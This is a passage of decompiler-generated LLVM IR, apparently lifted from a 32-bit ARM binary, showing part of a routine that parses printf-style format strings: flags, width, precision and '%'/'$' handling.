  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp117 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-111 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i8*, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10e18 = load i32, i32* @r4, align 4
  store i32 %v3_10e18, i32* %stack_var_-36, align 4
  %v6_10e18 = load i32, i32* @r5, align 4
  %v27_10e18 = load i32, i32* @lr, align 4
  %v0_10e1c = load i32, i32* %r0.global-to-local, align 4
  %v1_10e1c = add i32 %v0_10e1c, 16
  %v2_10e1c = inttoptr i32 %v1_10e1c to i32*
  %v3_10e1c = load i32, i32* %v2_10e1c, align 4
  %v1_10e24 = and i32 %v3_10e1c, 128
  store i32 %v1_10e24, i32* @r4, align 4
  %v2_10e24 = icmp eq i32 %v1_10e24, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %v0_10e1c, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @lr, align 4
  %v1_10e4c = add i32 %v0_10e1c, 24
  %v2_10e4c = inttoptr i32 %v1_10e4c to i32*
  %v3_10e4c = load i32, i32* %v2_10e4c, align 4
  store i32 %v3_10e4c, i32* %fp.global-to-local, align 4
  br i1 %v2_10e24, label %.dec_label_pc_10ea0_crit_edge, label %dec_label_pc_10e58

.dec_label_pc_10ea0_crit_edge:                    ; preds = %entry
  %v2_10e50 = inttoptr i32 %v0_10e1c to i32*
  %v3_10e50 = load i32, i32* %v2_10e50, align 4
  store i32 %v3_10e50, i32* %r0.global-to-local, align 4
  %.pre = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_10ea0

dec_label_pc_10e58:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10e68 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_10e5c

dec_label_pc_10e5c:                               ; preds = %dec_label_pc_10e8c.dec_label_pc_10e5c_crit_edge, %dec_label_pc_10e58
  %v1_10e6c = phi i32 [ %v1_10e7c, %dec_label_pc_10e8c.dec_label_pc_10e5c_crit_edge ], [ 0, %dec_label_pc_10e58 ]
  %v0_10e5c = phi i32 [ %v0_10e5c.pre, %dec_label_pc_10e8c.dec_label_pc_10e5c_crit_edge ], [ %v0_10e1c, %dec_label_pc_10e58 ]
  %v1_10e5c = inttoptr i32 %v0_10e5c to i32*
  %v2_10e5c = load i32, i32* %v1_10e5c, align 4
  %v4_10e60 = mul i32 %v1_10e6c, 4
  %v5_10e60 = add i32 %v2_10e5c, %v4_10e60
  store i32 %v5_10e60, i32* %r3.global-to-local, align 4
  %v1_10e64 = add i32 %v5_10e60, -4
  %v2_10e64 = inttoptr i32 %v1_10e64 to i8*
  %v3_10e64 = load i8, i8* %v2_10e64, align 1
  %v4_10e64 = zext i8 %v3_10e64 to i32
  store i32 %v4_10e64, i32* %r1.global-to-local, align 4
  store i32 %v2_10e68, i32* @ip, align 4
  %v2_10e6c = add i32 %v1_10e6c, %v2_10e68
  store i32 %v2_10e6c, i32* %r2.global-to-local, align 4
  %v3_10e70 = add i32 %v2_10e6c, -72
  %v4_10e70 = inttoptr i32 %v3_10e70 to i8*
  store i8 %v3_10e64, i8* %v4_10e70, align 1
  %v0_10e74 = load i32, i32* %r3.global-to-local, align 4
  %v1_10e74 = add i32 %v0_10e74, -4
  %v2_10e74 = inttoptr i32 %v1_10e74 to i32*
  %v3_10e74 = load i32, i32* %v2_10e74, align 4
  store i32 %v3_10e74, i32* %r3.global-to-local, align 4
  %v0_10e78 = load i32, i32* %r1.global-to-local, align 4
  %v9_10e78 = icmp eq i32 %v0_10e78, %v3_10e74
  %v0_10e7c = load i32, i32* %r0.global-to-local, align 4
  %v1_10e7c = add i32 %v0_10e7c, 1
  store i32 %v1_10e7c, i32* %r0.global-to-local, align 4
  br i1 %v9_10e78, label %dec_label_pc_10e84, label %dec_label_pc_11348

dec_label_pc_10e84:                               ; preds = %dec_label_pc_10e5c
  %v2_10e84 = icmp eq i32 %v3_10e74, 0
  br i1 %v2_10e84, label %dec_label_pc_10e94, label %dec_label_pc_10e8c

dec_label_pc_10e8c:                               ; preds = %dec_label_pc_10e84
  %tmp182 = icmp ult i32 %v1_10e7c, 32
  br i1 %tmp182, label %dec_label_pc_10e8c.dec_label_pc_10e5c_crit_edge, label %dec_label_pc_10e94

dec_label_pc_10e8c.dec_label_pc_10e5c_crit_edge:  ; preds = %dec_label_pc_10e8c
  %v0_10e5c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10e5c

dec_label_pc_10e94:                               ; preds = %dec_label_pc_10e8c, %dec_label_pc_10e84
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10e9c = ptrtoint i32* %stack_var_-111 to i32
  store i32 %v2_10e9c, i32* %r0.global-to-local, align 4
  %v0_10eac.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_10ea0

dec_label_pc_10ea0:                               ; preds = %.dec_label_pc_10ea0_crit_edge, %dec_label_pc_10e94
  %v3_10ed4.pre-phi = phi i32 [ %.pre, %.dec_label_pc_10ea0_crit_edge ], [ %v2_10e68, %dec_label_pc_10e94 ]
  %v0_10ecc64 = phi i32 [ %v3_10e50, %.dec_label_pc_10ea0_crit_edge ], [ %v2_10e9c, %dec_label_pc_10e94 ]
  %v0_10eac = phi i32 [ ptrtoint (i32* @global_var_26934.581 to i32), %.dec_label_pc_10ea0_crit_edge ], [ %v0_10eac.pre, %dec_label_pc_10e94 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 1824, i32* %r2.global-to-local, align 4
  %v2_10eac = add i32 %v0_10eac, -36900
  store i32 %v2_10eac, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 -4, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v4_10ec0 = inttoptr i32 %v2_10eac to i8*
  store i8* %v4_10ec0, i8** %stack_var_-120, align 4
  br label %dec_label_pc_10ecc

dec_label_pc_10ec8:                               ; preds = %.thread20, %dec_label_pc_10ffc
  %v0_10ec8 = phi i32 [ %v2_11074, %.thread20 ], [ %v0_10fd876, %dec_label_pc_10ffc ]
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.3, %.thread20 ], [ %stack_var_-44.2, %dec_label_pc_10ffc ]
  store i32 %v0_10ec8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10ecc

dec_label_pc_10ecc:                               ; preds = %dec_label_pc_10ea0, %dec_label_pc_10ec8
  %v1_10ee0 = phi i32 [ %v0_10ecc64, %dec_label_pc_10ea0 ], [ %v0_10ec8, %dec_label_pc_10ec8 ]
  %stack_var_-44.1 = phi i32 [ %tmp117, %dec_label_pc_10ea0 ], [ %stack_var_-44.0, %dec_label_pc_10ec8 ]
  %v1_10ecc = inttoptr i32 %v1_10ee0 to i8*
  %v2_10ecc = load i8, i8* %v1_10ecc, align 1
  %v3_10ecc = zext i8 %v2_10ecc to i32
  store i32 %v3_10ecc, i32* %r3.global-to-local, align 4
  %v7_10ed0 = icmp eq i8 %v2_10ecc, 42
  br i1 %v7_10ed0, label %bb, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_10ecc
  store i32 %v1_10ee0, i32* %r6.global-to-local, align 4
  %v0_10ee4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10ee4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10f2c.preheader

bb:                                               ; preds = %dec_label_pc_10ecc
  %v1_10ed8 = load i32, i32* %r8.global-to-local, align 4
  %v2_10ed8 = load i32, i32* %sb.global-to-local, align 4
  %v4_10ed8 = mul i32 %v2_10ed8, %v1_10ed8
  %v5_10ed8 = add i32 %v4_10ed8, %v3_10ed4.pre-phi
  store i32 %v5_10ed8, i32* %r3.global-to-local, align 4
  %v2_10ee0 = add i32 %v1_10ee0, 1
  store i32 %v2_10ee0, i32* %r6.global-to-local, align 4
  %v0_10ee4111 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10ee4111, i32* %r1.global-to-local, align 4
  %v3_10ee8 = add i32 %v5_10ed8, -40
  %v4_10ee8 = inttoptr i32 %v3_10ee8 to i32*
  store i32 %v0_10ee4111, i32* %v4_10ee8, align 4
  %v0_10f30.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10f2c.preheader

dec_label_pc_10f2c.preheader:                     ; preds = %.thread8, %bb
  %v0_10f30.pre = phi i32 [ %v1_10ee0, %.thread8 ], [ %v0_10f30.pre.pre, %bb ]
  %v0_10f34.pre = load i32, i32* @lr, align 4
  %v2_10f34 = add i32 %v0_10f34.pre, 1824
  %v3_10f34 = inttoptr i32 %v2_10f34 to i32*
  br label %dec_label_pc_10f2c

dec_label_pc_10ef0:                               ; preds = %dec_label_pc_10f2c
  store i32 214748363, i32* %r3.global-to-local, align 4
  %v0_10ef4 = load i32, i32* %r1.global-to-local, align 4
  %v2_10ef4 = add i32 %v0_10ef4, -214748363
  %tmp139 = sub i32 214748362, %v0_10ef4
  %v6_10ef4 = and i32 %tmp139, %v0_10ef4
  %v7_10ef4 = icmp slt i32 %v6_10ef4, 0
  %v8_10ef4 = icmp slt i32 %v2_10ef4, 0
  %v9_10ef4 = icmp eq i32 %v0_10ef4, 214748363
  %v3_10ef8 = xor i1 %v8_10ef4, %v7_10ef4
  %v4_10ef8 = or i1 %v9_10ef4, %v3_10ef8
  br i1 %v4_10ef8, label %dec_label_pc_10f10, label %dec_label_pc_10efc

dec_label_pc_10efc:                               ; preds = %dec_label_pc_10ef0
  store i32 214748364, i32* %r2.global-to-local, align 4
  %v9_10f00 = icmp eq i32 %v0_10ef4, 214748364
  br i1 %v9_10f00, label %dec_label_pc_10f08, label %dec_label_pc_10f28

dec_label_pc_10f08:                               ; preds = %dec_label_pc_10efc
  %v8_10f0c = icmp ugt i8 %v2_10f30, 55
  br i1 %v8_10f0c, label %dec_label_pc_10f28, label %dec_label_pc_10f10

dec_label_pc_10f10:                               ; preds = %dec_label_pc_10f08, %dec_label_pc_10ef0
  %v2_10f14 = mul i32 %v0_10ef4, 10
  %v1_10f18 = add i32 %v2_10f14, -48
  store i32 %v1_10f18, i32* %r3.global-to-local, align 4
  %v2_10f1c = add i32 %v1_10f18, %v3_10f30
  br label %dec_label_pc_10f28

dec_label_pc_10f28:                               ; preds = %dec_label_pc_10f08, %dec_label_pc_10efc, %dec_label_pc_10f10
  %storemerge = phi i32 [ %v2_10f1c, %dec_label_pc_10f10 ], [ 2147483647, %dec_label_pc_10efc ], [ 2147483647, %dec_label_pc_10f08 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_10f28 = add i32 %v0_10fb0, 1
  store i32 %v1_10f28, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10f2c

dec_label_pc_10f2c:                               ; preds = %dec_label_pc_10f2c.preheader, %dec_label_pc_10f28
  %v0_10fb0 = phi i32 [ %v0_10f30.pre, %dec_label_pc_10f2c.preheader ], [ %v1_10f28, %dec_label_pc_10f28 ]
  store i32 1824, i32* %r2.global-to-local, align 4
  %v1_10f30 = inttoptr i32 %v0_10fb0 to i8*
  %v2_10f30 = load i8, i8* %v1_10f30, align 1
  %v3_10f30 = zext i8 %v2_10f30 to i32
  store i32 %v3_10f30, i32* @ip, align 4
  %v4_10f34 = load i32, i32* %v3_10f34, align 4
  store i32 %v4_10f34, i32* %r3.global-to-local, align 4
  %v2_10f38 = mul nuw nsw i32 %v3_10f30, 2
  store i32 %v2_10f38, i32* %r2.global-to-local, align 4
  %v2_10f3c = add i32 %v2_10f38, %v4_10f34
  %v3_10f3c = inttoptr i32 %v2_10f3c to i16*
  %v4_10f3c = load i16, i16* %v3_10f3c, align 2
  %v6_10f3c = zext i16 %v4_10f3c to i32
  store i32 %v6_10f3c, i32* %r3.global-to-local, align 4
  %v1_10f40 = and i32 %v6_10f3c, 8
  %v2_10f40 = icmp eq i32 %v1_10f40, 0
  br i1 %v2_10f40, label %dec_label_pc_10f48, label %dec_label_pc_10ef0

dec_label_pc_10f48:                               ; preds = %dec_label_pc_10f2c
  %v0_10f48 = load i32, i32* %r0.global-to-local, align 4
  %v1_10f48 = add i32 %v0_10f48, -1
  %v2_10f48 = inttoptr i32 %v1_10f48 to i8*
  %v3_10f48 = load i8, i8* %v2_10f48, align 1
  %v4_10f48 = zext i8 %v3_10f48 to i32
  store i32 %v4_10f48, i32* %r3.global-to-local, align 4
  %v7_10f4c = icmp eq i8 %v3_10f48, 37
  br i1 %v7_10f4c, label %dec_label_pc_10f54, label %dec_label_pc_11014

dec_label_pc_10f54:                               ; preds = %dec_label_pc_10f48
  %v7_10f54 = icmp eq i8 %v2_10f30, 36
  %. = zext i1 %v7_10f54 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_10f60 = load i32, i32* %r1.global-to-local, align 4
  %tmp143 = icmp slt i32 %v0_10f60, 1
  br i1 %tmp143, label %bb144, label %thread-pre-split

bb144:                                            ; preds = %dec_label_pc_10f54
  store i32 0, i32* %r3.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_10f54, %bb144
  %v0_10f68 = phi i32 [ 0, %bb144 ], [ %., %dec_label_pc_10f54 ]
  %v2_10f68 = icmp eq i32 %v0_10f68, 0
  %v0_10f9c = load i32, i32* %fp.global-to-local, align 4
  br i1 %v2_10f68, label %dec_label_pc_10f9c, label %dec_label_pc_10f70

dec_label_pc_10f70:                               ; preds = %thread-pre-split
  %v2_10f9c = icmp eq i32 %v0_10f9c, 0
  %v1_10f74 = add i32 %v0_10fb0, 1
  store i32 %v1_10f74, i32* %r0.global-to-local, align 4
  br i1 %v2_10f9c, label %dec_label_pc_11348, label %dec_label_pc_10f7c

dec_label_pc_10f7c:                               ; preds = %dec_label_pc_10f70
  %v2_10f7c = sub i32 %v0_10f60, %v0_10f9c
  %v4_10f7c = xor i32 %v0_10f9c, %v0_10f60
  %v5_10f7c = xor i32 %v2_10f7c, %v0_10f60
  %v6_10f7c = and i32 %v5_10f7c, %v4_10f7c
  %v7_10f7c = icmp slt i32 %v6_10f7c, 0
  %v8_10f7c = icmp slt i32 %v2_10f7c, 0
  %v9_10f7c = icmp eq i32 %v0_10f60, %v0_10f9c
  %v3_10f80 = xor i1 %v8_10f7c, %v7_10f7c
  %v4_10f80 = or i1 %v9_10f7c, %v3_10f80
  br i1 %v4_10f80, label %dec_label_pc_10f90, label %bb145

bb145:                                            ; preds = %dec_label_pc_10f7c
  store i32 %v0_10f60, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_10f90

dec_label_pc_10f8c:                               ; preds = %dec_label_pc_10fb0, %dec_label_pc_10fb8
  %v0_10f8c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10f8c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_10f90

dec_label_pc_10f90:                               ; preds = %bb145, %dec_label_pc_10f7c, %dec_label_pc_10f8c
  %v0_10f90 = phi i32 [ %v0_10f48, %dec_label_pc_10f8c ], [ %v1_10f74, %dec_label_pc_10f7c ], [ %v1_10f74, %bb145 ]
  %stack_var_-44.2 = phi i32 [ %stack_var_-44.1, %dec_label_pc_10f8c ], [ %v0_10f60, %dec_label_pc_10f7c ], [ %v0_10f60, %bb145 ]
  store i32 %v0_10f90, i32* %r6.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  %v2_10fcc.pre = load i8*, i8** %stack_var_-120, align 4
  %v3_10fcc = ptrtoint i8* %v2_10fcc.pre to i32
  br label %dec_label_pc_10fcc

dec_label_pc_10f9c:                               ; preds = %thread-pre-split
  %tmp146 = icmp slt i32 %v0_10f9c, 1
  br i1 %tmp146, label %dec_label_pc_10fb0, label %dec_label_pc_10fa4

dec_label_pc_10fa4:                               ; preds = %dec_label_pc_10f9c
  %v7_10fa4 = icmp eq i8 %v2_10f30, 109
  br i1 %v7_10fa4, label %dec_label_pc_11014, label %dec_label_pc_11348

dec_label_pc_10fb0:                               ; preds = %dec_label_pc_10f9c
  %tmp183 = icmp ugt i32 %v0_10fb0, %v0_10f48
  br i1 %tmp183, label %dec_label_pc_10fb8, label %dec_label_pc_10f8c

dec_label_pc_10fb8:                               ; preds = %dec_label_pc_10fb0
  %v1_10fb8 = inttoptr i32 %v0_10f48 to i8*
  %v2_10fb8 = load i8, i8* %v1_10fb8, align 1
  %v3_10fb8 = zext i8 %v2_10fb8 to i32
  store i32 %v3_10fb8, i32* %r3.global-to-local, align 4
  %v7_10fbc = icmp eq i8 %v2_10fb8, 48
  br i1 %v7_10fbc, label %dec_label_pc_10f8c, label %bb147

bb147:                                            ; preds = %dec_label_pc_10fb8
  %v1_10fc0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_10fc0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_11014

dec_label_pc_10fcc.loopexit:                      ; preds = %dec_label_pc_10fd4
  %v1_10fe0 = load i32, i32* @r4, align 4
  %v3_10fe0 = or i32 %v1_10fe0, %v0_10ff4
  store i32 %v3_10fe0, i32* @r4, align 4
  %v2_10fe4 = add i32 %v0_10fd876, 1
  store i32 %v2_10fe4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10fcc

dec_label_pc_10fcc:                               ; preds = %dec_label_pc_10fcc.loopexit, %dec_label_pc_10f90
  %v0_10fd876 = phi i32 [ %v2_10fe4, %dec_label_pc_10fcc.loopexit ], [ %v0_10f90, %dec_label_pc_10f90 ]
  store i32 %v3_10fcc, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_10fd8 = inttoptr i32 %v0_10fd876 to i8*
  br label %dec_label_pc_10fd4

dec_label_pc_10fd4:                               ; preds = %dec_label_pc_10fec, %dec_label_pc_10fcc
  %v0_10ff4 = phi i32 [ %v2_10ff4, %dec_label_pc_10fec ], [ 1, %dec_label_pc_10fcc ]
  %v0_10fd4 = phi i32 [ %v5_10fd4, %dec_label_pc_10fec ], [ %v3_10fcc, %dec_label_pc_10fcc ]
  %v1_10fd4 = inttoptr i32 %v0_10fd4 to i8*
  %v2_10fd4 = load i8, i8* %v1_10fd4, align 1
  %v3_10fd4 = zext i8 %v2_10fd4 to i32
  store i32 %v3_10fd4, i32* %r2.global-to-local, align 4
  %v5_10fd4 = add i32 %v0_10fd4, 1
  store i32 %v5_10fd4, i32* %r0.global-to-local, align 4
  %v2_10fd8 = load i8, i8* %v1_10fd8, align 1
  %v3_10fd8 = zext i8 %v2_10fd8 to i32
  store i32 %v3_10fd8, i32* %r3.global-to-local, align 4
  %v9_10fdc = icmp eq i8 %v2_10fd8, %v2_10fd4
  br i1 %v9_10fdc, label %dec_label_pc_10fcc.loopexit, label %dec_label_pc_10fec

dec_label_pc_10fec:                               ; preds = %dec_label_pc_10fd4
  %v1_10fec = inttoptr i32 %v5_10fd4 to i8*
  %v2_10fec = load i8, i8* %v1_10fec, align 1
  %v3_10fec = zext i8 %v2_10fec to i32
  store i32 %v3_10fec, i32* %r3.global-to-local, align 4
  %v2_10ff0 = icmp eq i8 %v2_10fec, 0
  %v2_10ff4 = mul i32 %v0_10ff4, 2
  store i32 %v2_10ff4, i32* %r1.global-to-local, align 4
  br i1 %v2_10ff0, label %dec_label_pc_10ffc, label %dec_label_pc_10fd4

dec_label_pc_10ffc:                               ; preds = %dec_label_pc_10fec
  %v1_10ffc = add i32 %v0_10fd876, -1
  %v2_10ffc = inttoptr i32 %v1_10ffc to i8*
  %v3_10ffc = load i8, i8* %v2_10ffc, align 1
  %v7_11000 = icmp eq i8 %v3_10ffc, 37
  %v0_11004 = load i32, i32* @r4, align 4
  %v1_11004 = and i32 %v0_11004, 10
  store i32 %v1_11004, i32* %r3.global-to-local, align 4
  %v4_11008 = udiv i32 %v1_11004, 2
  %v5_11008 = sub nuw nsw i32 -1, %v4_11008
  %v6_11008 = and i32 %v0_11004, %v5_11008
  store i32 %v6_11008, i32* @r4, align 4
  br i1 %v7_11000, label %dec_label_pc_11010, label %dec_label_pc_10ec8

dec_label_pc_11010:                               ; preds = %dec_label_pc_10ffc
  %v0_11010 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11010, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11014

dec_label_pc_11014:                               ; preds = %bb147, %dec_label_pc_10f48, %dec_label_pc_10fa4, %dec_label_pc_11010
  %v1_11054 = phi i32 [ %v0_10fd876, %dec_label_pc_11010 ], [ %v0_10fb0, %bb147 ], [ %v0_10fb0, %dec_label_pc_10fa4 ], [ %v0_10fb0, %dec_label_pc_10f48 ]
  %v0_11050 = phi i32 [ %v5_10fd4, %dec_label_pc_11010 ], [ %v0_10f48, %bb147 ], [ %v0_10f48, %dec_label_pc_10fa4 ], [ %v0_10f48, %dec_label_pc_10f48 ]
  %stack_var_-44.3 = phi i32 [ %stack_var_-44.2, %dec_label_pc_11010 ], [ %stack_var_-44.1, %bb147 ], [ %stack_var_-44.1, %dec_label_pc_10fa4 ], [ %stack_var_-44.1, %dec_label_pc_10f48 ]
  %v1_11014 = inttoptr i32 %v0_11050 to i8*
  %v2_11014 = load i8, i8* %v1_11014, align 1
  %v3_11014 = zext i8 %v2_11014 to i32
  store i32 %v3_11014, i32* %r3.global-to-local, align 4
  %v7_11018 = icmp eq i8 %v2_11014, 42
  br i1 %v7_11018, label %dec_label_pc_11020, label %dec_label_pc_11060

dec_label_pc_11020:                               ; preds = %dec_label_pc_11014
  %v0_11020 = load i32, i32* %fp.global-to-local, align 4
  %v2_11020 = icmp eq i32 %v0_11020, 0
  br i1 %v2_11020, label %dec_label_pc_11050, label %dec_label_pc_11028

dec_label_pc_11028:                               ; preds = %dec_label_pc_11020
  %v1_11028 = inttoptr i32 %v1_11054 to i8*
  %v2_11028 = load i8, i8* %v1_11028, align 1
  %v3_11028 = zext i8 %v2_11028 to i32
  store i32 %v3_11028, i32* %r3.global-to-local, align 4
  %v7_1102c = icmp eq i8 %v2_11028, 36
  br i1 %v7_1102c, label %dec_label_pc_11034, label %dec_label_pc_11348

dec_label_pc_11034:                               ; preds = %dec_label_pc_11028
  %v0_11034 = load i32, i32* %r1.global-to-local, align 4
  %tmp148 = icmp slt i32 %v0_11034, 1
  br i1 %tmp148, label %dec_label_pc_11348, label %dec_label_pc_1103c

dec_label_pc_1103c:                               ; preds = %dec_label_pc_11034
  %v0_11040 = load i32, i32* %r8.global-to-local, align 4
  %v1_11040 = load i32, i32* %sb.global-to-local, align 4
  %v3_11040 = mul i32 %v1_11040, %v0_11040
  %v4_11040 = add i32 %v3_11040, %v3_10ed4.pre-phi
  store i32 %v4_11040, i32* %r3.global-to-local, align 4
  %v1_11044 = add i32 %v1_11054, 1
  store i32 %v1_11044, i32* %r6.global-to-local, align 4
  %v2_11048 = add i32 %v4_11040, -12
  %v3_11048 = inttoptr i32 %v2_11048 to i32*
  store i32 %v0_11034, i32* %v3_11048, align 4
  br label %dec_label_pc_1105c

dec_label_pc_11050:                               ; preds = %dec_label_pc_11020
  %v1_11050 = add i32 %v0_11050, 1
  store i32 %v1_11050, i32* %r3.global-to-local, align 4
  %v9_11054 = icmp eq i32 %v1_11050, %v1_11054
  br i1 %v9_11054, label %dec_label_pc_1105c, label %dec_label_pc_11348

dec_label_pc_1105c:                               ; preds = %dec_label_pc_11050, %dec_label_pc_1103c
  store i32 -2147483648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11060

dec_label_pc_11060:                               ; preds = %dec_label_pc_11014, %dec_label_pc_1105c
  %v0_11060 = load i32, i32* %r8.global-to-local, align 4
  %v2_11060 = icmp eq i32 %v0_11060, 0
  br i1 %v2_11060, label %dec_label_pc_1106c, label %dec_label_pc_1108c.loopexit

dec_label_pc_1106c:                               ; preds = %dec_label_pc_11060
  %v0_1106c = load i32, i32* %r6.global-to-local, align 4
  %v1_1106c = inttoptr i32 %v0_1106c to i8*
  %v2_1106c = load i8, i8* %v1_1106c, align 1
  %v3_1106c = zext i8 %v2_1106c to i32
  store i32 %v3_1106c, i32* %r3.global-to-local, align 4
  %v7_11070 = icmp eq i8 %v2_1106c, 46
  br i1 %v7_11070, label %.thread20, label %dec_label_pc_11084

.thread20:                                        ; preds = %dec_label_pc_1106c
  %v2_11074 = add i32 %v0_1106c, 1
  store i32 %v2_11074, i32* %r6.global-to-local, align 4
  %v1_11078 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_11078, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10ec8

dec_label_pc_11084:                               ; preds = %dec_label_pc_1106c
  %v0_11084 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11084, i32* %sl.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  br label %dec_label_pc_1108c

dec_label_pc_1108c.loopexit:                      ; preds = %dec_label_pc_11060
  %v1_11064 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_11064, i32* @r5, align 4
  %v0_11098.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1108c

dec_label_pc_1108c:                               ; preds = %dec_label_pc_1108c.loopexit, %dec_label_pc_11084
  %v0_11098.pre = phi i32 [ %v0_11098.pre.pre, %dec_label_pc_1108c.loopexit ], [ %v0_1106c, %dec_label_pc_11084 ]
  store i32 -37024, i32* %r3.global-to-local, align 4
  %v0_11090 = load i32, i32* @lr, align 4
  %v2_11090 = add i32 %v0_11090, -37024
  store i32 %v2_11090, i32* %r1.global-to-local, align 4
  %v1_11098 = inttoptr i32 %v0_11098.pre to i8*
  br label %dec_label_pc_11094

dec_label_pc_11094:                               ; preds = %dec_label_pc_110a8, %dec_label_pc_1108c
  %v0_110a8 = phi i32 [ %v1_110a8, %dec_label_pc_110a8 ], [ %v2_11090, %dec_label_pc_1108c ]
  %v1_11094 = inttoptr i32 %v0_110a8 to i8*
  %v2_11094 = load i8, i8* %v1_11094, align 1
  %v3_11094 = zext i8 %v2_11094 to i32
  store i32 %v3_11094, i32* %r2.global-to-local, align 4
  %v2_11098 = load i8, i8* %v1_11098, align 1
  %v3_11098 = zext i8 %v2_11098 to i32
  store i32 %v3_11098, i32* %r3.global-to-local, align 4
  %v9_1109c = icmp eq i8 %v2_11098, %v2_11094
  br i1 %v9_1109c, label %bb149, label %dec_label_pc_110a8

bb149:                                            ; preds = %dec_label_pc_11094
  %v2_110a0 = add i32 %v0_11098.pre, 1
  store i32 %v2_110a0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_110b4

dec_label_pc_110a8:                               ; preds = %dec_label_pc_11094
  %v1_110a8 = add i32 %v0_110a8, 1
  %v2_110a8 = inttoptr i32 %v1_110a8 to i8*
  %v3_110a8 = load i8, i8* %v2_110a8, align 1
  %v4_110a8 = zext i8 %v3_110a8 to i32
  store i32 %v4_110a8, i32* %r3.global-to-local, align 4
  store i32 %v1_110a8, i32* %r1.global-to-local, align 4
  %v2_110ac = icmp eq i8 %v3_110a8, 0
  br i1 %v2_110ac, label %dec_label_pc_110b4, label %dec_label_pc_11094

dec_label_pc_110b4:                               ; preds = %dec_label_pc_110a8, %bb149
  %v1_110d8 = phi i32 [ %v2_110a0, %bb149 ], [ %v0_11098.pre, %dec_label_pc_110a8 ]
  %v1_110d4 = phi i32 [ %v0_110a8, %bb149 ], [ %v1_110a8, %dec_label_pc_110a8 ]
  %v2_110bc = sub i32 %v1_110d4, %v2_11090
  store i32 %v2_110bc, i32* %r3.global-to-local, align 4
  %v8_110c4 = icmp sgt i32 %v2_110bc, 1
  br i1 %v8_110c4, label %.thread24, label %dec_label_pc_110c8

dec_label_pc_110c8:                               ; preds = %dec_label_pc_110b4
  %v1_110c8 = inttoptr i32 %v1_110d8 to i8*
  %v2_110c8 = load i8, i8* %v1_110c8, align 1
  %v3_110c8 = zext i8 %v2_110c8 to i32
  store i32 %v3_110c8, i32* %r2.global-to-local, align 4
  %v1_110cc = inttoptr i32 %v1_110d4 to i8*
  %v2_110cc = load i8, i8* %v1_110cc, align 1
  %v3_110cc = zext i8 %v2_110cc to i32
  store i32 %v3_110cc, i32* %r3.global-to-local, align 4
  %v9_110d0 = icmp eq i8 %v2_110c8, %v2_110cc
  br i1 %v9_110d0, label %bb150, label %.thread24

bb150:                                            ; preds = %dec_label_pc_110c8
  %v2_110d4 = add i32 %v1_110d4, 9
  store i32 %v2_110d4, i32* %r1.global-to-local, align 4
  %v2_110d8 = add i32 %v1_110d8, 1
  store i32 %v2_110d8, i32* %r6.global-to-local, align 4
  br label %.thread24

.thread24:                                        ; preds = %dec_label_pc_110c8, %dec_label_pc_110b4, %bb150
  %v0_110e0 = phi i32 [ %v1_110d4, %dec_label_pc_110c8 ], [ %v1_110d4, %dec_label_pc_110b4 ], [ %v2_110d4, %bb150 ]
  %v0_110dc = phi i32 [ %v1_110d8, %dec_label_pc_110c8 ], [ %v1_110d8, %dec_label_pc_110b4 ], [ %v2_110d8, %bb150 ]
  %v1_110dc = inttoptr i32 %v0_110dc to i8*
  %v2_110dc = load i8, i8* %v1_110dc, align 1
  %v3_110dc = zext i8 %v2_110dc to i32
  store i32 %v3_110dc, i32* %r2.global-to-local, align 4
